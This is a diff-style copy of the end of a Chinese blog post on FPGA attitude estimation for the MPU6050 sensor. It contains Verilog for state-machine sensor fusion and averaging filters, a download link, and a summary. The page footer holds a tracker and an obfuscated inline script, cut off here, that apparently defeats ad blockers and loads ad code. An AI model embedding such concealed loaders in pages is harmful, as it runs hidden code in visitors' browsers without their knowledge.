+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   amplitude_accy_accz<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   acc_roll<span class="token punctuation">;</span>
+
+wire pitch_req<span class="token punctuation">;</span>
+wire pitch_ack<span class="token punctuation">;</span>
+wire <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>   acc_pitch<span class="token punctuation">;</span>
+
+
+<span class="token comment">//角速度单位时间内 造成的角度变化量 ( ( x / 4.1 ) / 100 ) &lt;&lt;&lt; 16   ==  /512 + /2048  运算周期为 10ms</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    gyro_dt_roll<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    gyro_dt_pitch<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    gyro_dt_yaw<span class="token punctuation">;</span>
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    gyro_roll<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    gyro_pitch<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    gyro_yaw<span class="token punctuation">;</span>
+
+
+<span class="token comment">//平均滤波</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    roll_d0<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    roll_d1<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    roll_d2<span class="token punctuation">;</span>
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    pitch_d0<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    pitch_d1<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    pitch_d2<span class="token punctuation">;</span>
+
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    yaw_d0<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    yaw_d1<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span>    yaw_d2<span class="token punctuation">;</span>
+
+
+<span class="token comment">//最终的角度值输出</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> roll<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> pitch<span class="token punctuation">;</span>
+reg <span class="token keyword">signed</span><span class="token punctuation">[</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">]</span> yaw<span class="token punctuation">;</span>
+
+assign roll_req <span class="token operator">=</span> <span class="token punctuation">(</span> state <span class="token operator">==</span> S_ROLL<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span><span class="token char">'b1 : 1'</span>b0<span class="token punctuation">;</span>
+assign pitch_req <span class="token operator">=</span> <span class="token punctuation">(</span> state <span class="token operator">==</span> S_PITCH<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span><span class="token char">'b1 : 1'</span>b0<span class="token punctuation">;</span>
+
+
+
+assign mpu6050_imu_ack_o <span class="token operator">=</span> <span class="token punctuation">(</span> state <span class="token operator">==</span> S_ACK<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span><span class="token char">'b1 : 1'</span>b0<span class="token punctuation">;</span>
+
+assign mpu6050_angle_roll_o  <span class="token operator">=</span> roll<span class="token punctuation">;</span>
+assign mpu6050_angle_pitch_o <span class="token operator">=</span> pitch<span class="token punctuation">;</span>
+assign mpu6050_angle_yaw_o   <span class="token operator">=</span> yaw<span class="token punctuation">;</span>
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0 <span class="token punctuation">)</span>
+        state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    <span class="token keyword">else</span> 
+        state <span class="token operator">&lt;=</span> next_state<span class="token punctuation">;</span>
+end
+
+always@<span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> begin
+    <span class="token keyword">case</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>
+    S_IDLE<span class="token operator">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> mpu6050_imu_req_i <span class="token operator">==</span> <span class="token number">1</span>'b1 <span class="token punctuation">)</span>
+            next_state <span class="token operator">&lt;=</span> S_ROLL<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            next_state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    S_ROLL<span class="token operator">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> roll_ack <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+            next_state <span class="token operator">&lt;=</span> S_PITCH<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            next_state <span class="token operator">&lt;=</span> S_ROLL<span class="token punctuation">;</span>
+    S_PITCH<span class="token operator">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> pitch_ack <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span>
+            next_state <span class="token operator">&lt;=</span> S_GYRO_RP<span class="token punctuation">;</span>
+        <span class="token keyword">else</span>
+            next_state <span class="token operator">&lt;=</span> S_PITCH<span class="token punctuation">;</span>
+    S_GYRO_RP<span class="token operator">:</span>
+        next_state <span class="token operator">&lt;=</span> S_IMU<span class="token punctuation">;</span>
+    S_IMU<span class="token operator">:</span>
+        next_state <span class="token operator">&lt;=</span> S_MEAN<span class="token punctuation">;</span>
+    S_MEAN<span class="token operator">:</span>
+        next_state <span class="token operator">&lt;=</span> S_ACK<span class="token punctuation">;</span>
+    S_ACK<span class="token operator">:</span>
+        next_state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    <span class="token keyword">default</span><span class="token operator">:</span> next_state <span class="token operator">&lt;=</span> S_IDLE<span class="token punctuation">;</span>
+    endcase
+
+end
+
+
+
+
+
+
+<span class="token comment">//计算gyro造成的角度变化量</span>
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        gyro_dt_roll  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        gyro_dt_pitch <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        gyro_dt_yaw   <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_ROLL <span class="token operator">&amp;&amp;</span> roll_ack <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span> begin
+        gyro_dt_roll  <span class="token operator">&lt;=</span> GYROX_i <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>
+        gyro_dt_pitch <span class="token operator">&lt;=</span> GYROY_i <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>
+        gyro_dt_yaw   <span class="token operator">&lt;=</span> GYROZ_i <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_PITCH <span class="token operator">&amp;&amp;</span> pitch_ack <span class="token operator">==</span> <span class="token number">1</span>'b1<span class="token punctuation">)</span> begin
+        gyro_dt_roll  <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>gyro_dt_roll <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>gyro_dt_roll <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        gyro_dt_pitch <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>gyro_dt_pitch <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>gyro_dt_pitch <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        gyro_dt_yaw   <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>gyro_dt_yaw <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>gyro_dt_yaw <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+    end
+    <span class="token keyword">else</span> begin
+        gyro_dt_roll  <span class="token operator">&lt;=</span> gyro_dt_roll<span class="token punctuation">;</span>
+        gyro_dt_pitch <span class="token operator">&lt;=</span> gyro_dt_pitch<span class="token punctuation">;</span>
+        gyro_dt_yaw   <span class="token operator">&lt;=</span> gyro_dt_yaw<span class="token punctuation">;</span>
+    end
+end
+
+
+
+<span class="token comment">//计算角速度 测得的角度值</span>
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        gyro_roll  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        gyro_pitch <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        gyro_yaw   <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_GYRO_RP<span class="token punctuation">)</span> begin
+        gyro_roll  <span class="token operator">&lt;=</span> roll <span class="token operator">+</span> gyro_dt_roll<span class="token punctuation">;</span>
+        gyro_pitch <span class="token operator">&lt;=</span> pitch <span class="token operator">-</span> gyro_dt_pitch<span class="token punctuation">;</span>
+        gyro_yaw   <span class="token operator">&lt;=</span> yaw <span class="token operator">+</span> gyro_dt_yaw<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> begin
+        gyro_roll  <span class="token operator">&lt;=</span> gyro_roll<span class="token punctuation">;</span>
+        gyro_pitch <span class="token operator">&lt;=</span> gyro_pitch<span class="token punctuation">;</span>
+        gyro_yaw   <span class="token operator">&lt;=</span> gyro_yaw<span class="token punctuation">;</span>
+    end
+end
+
+
+<span class="token comment">//角度融合</span>
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        roll  <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        pitch <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        yaw   <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_IMU<span class="token punctuation">)</span> begin
+        roll  <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>acc_roll <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token punctuation">(</span>acc_roll <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>gyro_roll <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        pitch <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>acc_pitch <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>acc_pitch <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>gyro_pitch <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        yaw   <span class="token operator">&lt;=</span> gyro_yaw<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_MEAN<span class="token punctuation">)</span> begin
+        roll  <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>roll <span class="token operator">+</span> roll_d0 <span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        pitch <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>pitch <span class="token operator">+</span> pitch_d0 <span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        yaw <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>yaw <span class="token operator">+</span> yaw_d0 <span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> begin
+        roll  <span class="token operator">&lt;=</span> roll<span class="token punctuation">;</span>
+        pitch <span class="token operator">&lt;=</span> pitch<span class="token punctuation">;</span>
+        yaw   <span class="token operator">&lt;=</span> yaw<span class="token punctuation">;</span>
+    end
+
+end
+ 
+
+<span class="token comment">//对融合后的角度进行平均滤波</span>
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        roll_d0 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        roll_d1 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        roll_d2 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_ACK<span class="token punctuation">)</span> begin
+        roll_d0 <span class="token operator">&lt;=</span> roll<span class="token punctuation">;</span>
+        roll_d1 <span class="token operator">&lt;=</span> roll_d0<span class="token punctuation">;</span>
+        roll_d2 <span class="token operator">&lt;=</span> roll_d1<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> begin
+        roll_d0 <span class="token operator">&lt;=</span> roll_d0<span class="token punctuation">;</span>
+        roll_d1 <span class="token operator">&lt;=</span> roll_d1<span class="token punctuation">;</span>
+        roll_d2 <span class="token operator">&lt;=</span> roll_d2<span class="token punctuation">;</span>
+    end
+end 
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        pitch_d0 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        pitch_d1 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        pitch_d2 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_ACK<span class="token punctuation">)</span> begin
+        pitch_d0 <span class="token operator">&lt;=</span> pitch<span class="token punctuation">;</span>
+        pitch_d1 <span class="token operator">&lt;=</span> pitch_d0<span class="token punctuation">;</span>
+        pitch_d2 <span class="token operator">&lt;=</span> pitch_d1<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> begin
+        pitch_d0 <span class="token operator">&lt;=</span> pitch_d0<span class="token punctuation">;</span>
+        pitch_d1 <span class="token operator">&lt;=</span> pitch_d1<span class="token punctuation">;</span>
+        pitch_d2 <span class="token operator">&lt;=</span> pitch_d2<span class="token punctuation">;</span>
+    end
+end 
+
+always@<span class="token punctuation">(</span>posedge sys_clk_i or negedge sys_rst_n_i<span class="token punctuation">)</span> begin
+    <span class="token keyword">if</span><span class="token punctuation">(</span> sys_rst_n_i <span class="token operator">==</span> <span class="token number">1</span>'b0<span class="token punctuation">)</span> begin
+        yaw_d0 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        yaw_d1 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+        yaw_d2 <span class="token operator">&lt;=</span> 'd0<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span> state <span class="token operator">==</span> S_ACK<span class="token punctuation">)</span> begin
+        yaw_d0 <span class="token operator">&lt;=</span> yaw<span class="token punctuation">;</span>
+        yaw_d1 <span class="token operator">&lt;=</span> yaw_d0<span class="token punctuation">;</span>
+        yaw_d2 <span class="token operator">&lt;=</span> yaw_d1<span class="token punctuation">;</span>
+    end
+    <span class="token keyword">else</span> begin
+        yaw_d0 <span class="token operator">&lt;=</span> yaw_d0<span class="token punctuation">;</span>
+        yaw_d1 <span class="token operator">&lt;=</span> yaw_d1<span class="token punctuation">;</span>
+        yaw_d2 <span class="token operator">&lt;=</span> yaw_d2<span class="token punctuation">;</span>
+    end
+end 
+Cordic_arctan  <span class="token function">u0_Cordic_arctan</span><span class="token punctuation">(</span>
+
+    <span class="token punctuation">.</span><span class="token function">clk</span>                    <span class="token punctuation">(</span>       sys_clk_i           <span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">rst_n</span>                  <span class="token punctuation">(</span>       sys_rst_n_i         <span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    <span class="token punctuation">.</span><span class="token function">cordic_req</span>             <span class="token punctuation">(</span>       roll_req            <span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">cordic_ack</span>             <span class="token punctuation">(</span>       roll_ack            <span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    <span class="token punctuation">.</span><span class="token function">X</span>                      <span class="token punctuation">(</span>       ACCELZ_i            <span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">Y</span>                      <span class="token punctuation">(</span>       ACCELY_i            <span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    <span class="token punctuation">.</span><span class="token function">amplitude</span>              <span class="token punctuation">(</span>       amplitude_accy_accz <span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">//幅度，偏大1.64倍，这里做了近似处理</span>
+    <span class="token punctuation">.</span><span class="token function">theta</span>                  <span class="token punctuation">(</span>       acc_roll            <span class="token punctuation">)</span><span class="token comment">//扩大了2^16</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+Cordic_arctan  <span class="token function">u1_Cordic_arctan</span><span class="token punctuation">(</span>
+
+    <span class="token punctuation">.</span><span class="token function">clk</span>                    <span class="token punctuation">(</span>       sys_clk_i           <span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">rst_n</span>                  <span class="token punctuation">(</span>       sys_rst_n_i         <span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    <span class="token punctuation">.</span><span class="token function">cordic_req</span>             <span class="token punctuation">(</span>       pitch_req           <span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">cordic_ack</span>             <span class="token punctuation">(</span>       pitch_ack           <span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    <span class="token punctuation">.</span><span class="token function">X</span>                      <span class="token punctuation">(</span>       amplitude_accy_accz <span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token function">Y</span>                      <span class="token punctuation">(</span>       ACCELX_i            <span class="token punctuation">)</span><span class="token punctuation">,</span>
+
+    <span class="token punctuation">.</span><span class="token function">amplitude</span>              <span class="token punctuation">(</span>                           <span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">//幅度，偏大1.64倍，这里做了近似处理</span>
+    <span class="token punctuation">.</span><span class="token function">theta</span>                  <span class="token punctuation">(</span>       acc_pitch           <span class="token punctuation">)</span><span class="token comment">//扩大了2^16</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+endmodule
+
+</code></pre> 
+<h2><a id="_1099"></a>六、资源消耗&amp;工程获取</h2> 
+<p>因为代码写的比较冗余，暂时还没有优化，所以暂用了较多的寄存器。<br> <img src="https://images2.imgbox.com/57/3b/jtPdp32F_o.png" alt="在这里插入图片描述"><br> 链接：https://pan.baidu.com/s/13fpE8ncS_-kW4XjDe2Xpmw?pwd=JWQL<br> 提取码：JWQL<br> –来自百度网盘超级会员V6的分享<br> <img src="https://images2.imgbox.com/07/c1/R7OJ1mv4_o.png" alt="在这里插入图片描述"></p> 
+<h2><a id="_1108"></a>七、总结</h2> 
+<p>      MPU6050具有高精度、低功耗和成本低廉的优点。它可以实现较高的测量精度和稳定性，同时功耗较低。另外，由于其成本低廉，可以广泛应用于各种领域。<br>       然而，MPU6050也存在一些缺点。首先，它只能测量物体在x、y、z三个方向上的加速度和角速度，无法对物体的位置进行直接测量。其次，MPU6050的测量结果受到环境因素的影响较大，需要进行校准以保证测量精度。最后，由于其测量结果的准确性受到多种因素的影响，需要通过算法进行数据处理和滤波，才能得到可靠的结果。<br>       总之，MPU6050可以作为简单版平衡车一类作品的姿态获取，如果作为无人机等精度较高的，还需要使用九轴传感器并结合高阶滤波器的信息作为校准点。</p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/e2d80bcdb49330fa6552e99f6d53fe5a/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">PythonStudio：一款国人写的python及窗口开发编辑IDE，可以替代pyqt designer等设计器了</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/52bc272a39c72f3004c2180d06460d6e/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">RHEL7.5编译openssl1.1.1w源码包到rpm包</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程爱好者博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 